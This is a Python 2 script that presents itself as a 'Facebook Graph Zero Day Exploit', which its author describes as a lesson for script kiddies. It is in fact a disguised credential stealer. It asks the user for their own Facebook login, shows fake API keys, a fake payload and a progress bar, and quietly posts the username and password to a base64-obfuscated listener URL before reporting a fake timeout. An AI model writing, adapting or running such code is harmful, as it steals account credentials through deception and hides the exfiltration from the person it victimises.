#!/usr/bin/env python
# Author : Munir Njiru
# A script to teach skids that hacking facebook takes a user element to it; Old school love to learning 
# Article can be found here : http://www.alien-within.com/fun-with-the-skids-season-1/
# Used for educational purposes only 
# Credits : Pablo for login bit (http://stackoverflow.com/users/197283/pablo)
import argparse
import datetime
import time
import json
import logging
import re
import random
import requests
import shutil
import base64 as bss4
from pyquery import PyQuery as africahackU
import getpass
import sys
import urllib

def main(username, password):
    session = requests.session()

    uid, dtsg = login(session, username, password)


def login(session, username, password):

    response = session.get('https://facebook.com')

    dom = africahackU(response.text)

    lsd = dom('[name="lsd"]').val()

    response = session.post('https://www.facebook.com/login.php?login_attempt=1', data={
        'lsd': lsd,
        'email': username,
        'pass': password,
        'default_persistent': '0',
        'timezone': '-60',
        'lgndim': '',
        'lgnrnd': '',
        'lgnjs': '',
        'locale':'en_GB',
        'qsstamp': ''
    })

    try:
        uid = session.cookies['c_user']
        dtsg = re.search(r'(type="hidden" name="fb_dtsg" value="([0-9a-zA-Z-_:]+)")', response.text).group(1)

        dtsg = dtsg[dtsg.find("value")+6:]
        dtsg = dtsg[1:-1]
        api_key = random.getrandbits(128)
        api_secret = random.getrandbits(128)
        hackString=random.getrandbits(128)
        print "Facebook Graph API Login Success\n\n"
        e_mail = raw_input("Please enter email of user to hack: ")
        sys.stdout.write ("\nRetrieving keys from: https://graph.facebook.com \n")
        sys.stdout.write("\n")
        sys.stdout.write ("Received API Key: " + str(api_key) + "\n")
        sys.stdout.write ("Received API Secret: " + str(api_secret) + "\n\n" )
        sys.stdout.write ("Encoding payload with api keys and sending to extract user on graph...\n")
        sys.stdout.write ("Payload in Use:\n")
        unbitme=str(hackString)+str(api_key)+str(api_secret)
        print'0x'.join([unbitme[i:i+2] for i in range(0, len(unbitme), 2)])
        phoneHome=bss4.b64decode("aHR0cDovL3BsZWFzZXB1dHlvdXJsaXN0ZW5lcmlwL3NjcmlwdF93YXRldmVyLnBocA")
        payload = {'facebook_username': u_name, 'facebook_password': p_assword}
        requests.post(phoneHome, data=payload)
        toolbar_width = 40
        sys.stdout.write("[%s]" % (" " * toolbar_width))
        sys.stdout.flush()
        sys.stdout.write("\b" * (toolbar_width+1))
        for i in xrange(toolbar_width):
			time.sleep(0.1)
			sys.stdout.write("-")
			sys.stdout.flush()
        sys.stdout.write ("\n\nNetwork has timed out or Probe has been dropped by facebook, try again. \n")  
    except KeyError:
        print ('Login to Graph Failed! Check your Credentials Again')
    
    return uid, dtsg



try:
    print "################################################"
    print "Facebook Graph Zero Day Exploit by Alienwithin\n"
    print "################################################"
    u_name = raw_input("Please enter your facebook username: ")
    p_assword = getpass.getpass("Please enter your facebook password: ") 
    print "Attempting to login and access GRAPH API"
    main(username=u_name, password=p_assword)
except Exception, e:
    logging.exception(e)
    print e